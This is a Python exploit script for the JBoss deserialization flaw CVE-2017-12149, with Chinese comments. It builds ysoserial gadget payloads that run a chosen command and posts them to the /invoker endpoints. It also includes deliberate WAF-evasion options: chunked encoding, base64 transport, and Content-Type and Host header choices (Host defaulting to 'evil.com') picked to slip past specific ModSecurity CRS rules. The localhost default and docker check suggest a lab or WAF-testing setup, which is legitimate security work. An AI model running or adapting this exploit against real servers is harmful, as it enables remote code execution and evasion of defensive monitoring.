# -*- coding: utf-8 -*-
"""JBoss CVE-2017-12149 exp。

官方 seed：POST 原生序列化数据到 /invoker/readonly（ysoserial CommonsCollections5）。
预留变异旋钮（WAF/RASP 轮用）：
  --endpoint   /invoker/readonly | /invoker/JMXInvokerServlet 等不同入口
  --gadget     ysoserial gadget 名（CC5/CC6/CB1/Jdk7u21...）
  --transport  raw | base64（JMXInvokerServlet 也接受 raw；base64 用于对比 WAF 对
               序列化魔数的可见性）
  --chunked    以 chunked 传输编码发送（打断按 Content-Length 扫描的实现）
  --ct         覆写 Content-Type
  --header     附加头（可重复）
"""
import argparse
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common import gen_yso, session  # noqa: E402


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18080)
    ap.add_argument("--endpoint", default="/invoker/readonly")
    ap.add_argument("--gadget", default="CommonsCollections5")
    ap.add_argument("--cmd", default="touch /tmp/pwn_jboss_r1")
    ap.add_argument("--transport", choices=["raw", "base64"], default="raw")
    ap.add_argument("--chunked", action="store_true")
    ap.add_argument("--ct", default=None)
    ap.add_argument("--host-header", default=None, help="覆写 Host 头（默认 evil.com 避开 920350）")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--out", default=None, help="载荷保存路径")
    ap.add_argument("--raw-file", default=None, help="跳过生成，直接发送预制 .ser")
    a = ap.parse_args()

    if a.raw_file:
        ser = a.raw_file
        payload = open(ser, "rb").read()
        print("[*] 预制载荷 %s (%d bytes)" % (ser, len(payload)))
    else:
        out = a.out or os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    "out", "poc_%s_%d.ser" % (a.gadget, int(time.time())))
        ser = gen_yso(a.gadget, a.cmd, out)
        with open(ser, "rb") as f:
            payload = f.read()
        print("[*] 载荷 %s (%d bytes) gadget=%s cmd=%s" % (ser, len(payload), a.gadget, a.cmd))

    url = "http://%s:%d%s" % (a.host, a.port, a.endpoint)
    headers = {}
    if a.ct:
        headers["Content-Type"] = a.ct
    else:
        # 协议卫生：避开 CRS 920340/920640（缺 CT）与 920420（CT 白名单）。
        # 必须取 CRS 允许列表内的类型；urlencoded 解析器对二进制只产生垃圾参数。
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    if a.host_header is None:
        a.host_header = "evil.com"   # 避开 CRS 920350（数字 IP Host）
    headers["Host"] = a.host_header
    for h in a.header:
        k, _, v = h.partition(":")
        headers[k.strip()] = v.strip()

    data = payload
    if a.transport == "base64":
        import base64
        data = base64.b64encode(payload)
        headers.setdefault("Content-Type", "text/plain")

    s = session()
    r = s.post(url, data=data, headers=headers, timeout=30)
    print("[*] POST %s -> HTTP %s, %d bytes" % (url, r.status_code, len(r.content)))
    print("[*] 真值核查（另开终端）: docker compose --profile jboss exec jboss ls -l --full-time /tmp")


if __name__ == "__main__":
    main()
